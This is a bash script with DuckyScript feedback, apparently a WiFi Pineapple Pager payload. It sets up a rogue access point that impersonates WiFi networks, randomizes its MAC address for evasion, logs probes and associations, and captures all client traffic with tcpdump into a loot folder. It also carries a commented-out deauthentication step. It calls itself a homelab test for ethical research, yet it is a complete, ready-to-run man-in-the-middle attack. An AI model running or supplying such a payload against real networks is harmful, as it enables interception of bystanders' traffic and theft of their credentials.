#!/bin/bash

# Title: MITM Test Payload
# Description: Sets up a rogue AP for Man-in-the-Middle testing in a homelab environment.
# This payload enables PineAP to impersonate WiFi networks, captures associations and probes,
# and logs traffic for analysis. Intended for ethical security research only.
# Assumes standard WiFi Pineapple Pager configuration with PineAP engine.

# DuckyScript commands for UI feedback
LED R FAST  # Indicate setup in progress (red blinking LED)
VIBRATE SHORT  # Short vibration alert
PLAY_RINGTONE ALERT  # Play alert ringtone
DISPLAY "Starting MITM Test"  # Display message on screen
DELAY 2000  # Wait 2 seconds for user to see message

# Configure PineAP for MITM (rogue AP, beacon responses, SSID pool)
uci set pineap.settings.enabled='1'
uci set pineap.settings.capture_ssids='1'
uci set pineap.settings.broadcast_ssid_pool='1'
uci set pineap.settings.beacon_responses='1'
uci set pineap.settings.log_probes='1'
uci set pineap.settings.log_associations='1'
uci set pineap.settings.ssid_additions='TestWiFi,HomeLabNet'  # Add test SSIDs to impersonate
uci set pineap.settings.source_mac='random'  # Randomize source MAC for evasion
uci commit pineap
/etc/init.d/pineap restart

# Start traffic capture (adjust interface if needed, e.g., br-lan for bridged LAN)
mkdir -p /root/loot/mitm_test
tcpdump -i br-lan -s 0 -w /root/loot/mitm_test/capture.pcap &  # Capture all packets
CAPTURE_PID=$!

# Run the test for 60 seconds (adjust for longer tests)
sleep 60

# Stop capture and clean up
kill $CAPTURE_PID
wait $CAPTURE_PID  # Ensure process stops cleanly

# DuckyScript commands for completion feedback
LED G SOLID  # Green solid LED for success
VIBRATE LONG  # Long vibration
PLAY_RINGTONE SUCCESS  # Play success ringtone
DISPLAY "MITM Test Complete. Capture saved to /root/loot/mitm_test/capture.pcap"
LOG "Captured traffic for analysis. Check logs for details."

# Optional: Deauth test (uncomment for deauth simulation on test clients)
# uci set pineap.settings.deauth='1'
# uci commit pineap
# /etc/init.d/pineap restart
# sleep 10
# uci set pineap.settings.deauth='0'
# uci commit pineap
# /etc/init.d/pineap restart
